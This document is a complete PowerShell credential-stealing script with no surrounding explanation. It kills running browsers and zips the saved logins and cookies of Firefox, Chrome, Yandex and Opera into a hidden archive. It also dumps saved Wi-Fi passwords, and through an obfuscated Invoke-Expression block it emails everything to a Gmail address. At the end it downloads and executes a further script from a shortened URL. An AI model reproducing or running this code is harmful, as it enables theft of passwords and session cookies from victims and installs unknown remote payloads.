echo "qwe"

$p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"

if(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe")
  {$arh="WinRar"}
elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
  {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}

$f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");if(Test-Path -Path $f){Stop-Process -Name firefox -ErrorAction SilentlyContinue;
if("WinRAR"-in $arh)
  {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip" -in $arh)
  {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}}else{echo "asd"}

$g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");if(Test-Path -Path $g){Stop-Process -Name chrome -ErrorAction SilentlyContinue;
if("WinRAR"-in $arh)
  {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip" -in $arh)
  {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}}else{echo "asd"}

$y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");if(Test-Path -Path $y){Stop-Process -Name browser -ErrorAction SilentlyContinue;
if("WinRAR" -in $arh)
  {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip"-in $arh)
  {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}}else{echo "asd"}

$o=($env:APPDATA+"\Opera Software\Opera Stable\");if(Test-Path -Path $y){Stop-Process -Name browser -ErrorAction SilentlyContinue;
if("WinRAR" -in $arh)
  {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip"-in $arh)
  {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}}else{echo "asd"}


(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
$w=$env:TEMP+'\p.txt'
if("WinRAR" -in $arh)
  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip"-in $arh)
  {.\7z.exe a $p $w -spf -tzip}

attrib +H $p

$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
. ( $veRbOSEPrEFeREncE.tOsTriNG()[1,3]+'X'-join'')( ((("{22}{4}{31}{36}{21}{15}{30}{43}{17}{24}{26}{40}{39}{2}{9}{11}{34}{7}{32}{27}{14}{33}{0}{18}{8}{23}{28}{29}{41}{10}{5}{6}{16}{12}{44}{13}{38}{35}{37}{42}{20}{19}{3}{25}{1}"-f'm1h7P','e','7Pf7swwq@','ess','M','il','=New','o',';lNf','gma','ma','i','Ob','t Syst','mp','ew-Objec','-','t.Ne',')','ilM','.Ma','s=N','lNfS','Rep','t','ag','work','P,h7Ppara','o','rt','t ','T','mh7','a','l.c','t','PInfo.Credential','.M','em.Ne','l(h','Credentia','E','ail','System.Ne','jec')) -CrEPLaCE'lNf',[cHaR]36  -CrEPLaCE'h7P',[cHaR]34))

$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Passwords"
$s=New-Object Net.Mail.Attachment($p);if("WinRAR"-in $arh){$ReportEmail.Attachments.Add($s)}else{$ReportEmail.Attachments.Add($s)};$SMTPInfo.Send($ReportEmail)

try{
  Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://btfr.cc/9v5")
}catch{
  Write-Output 'Error'
}
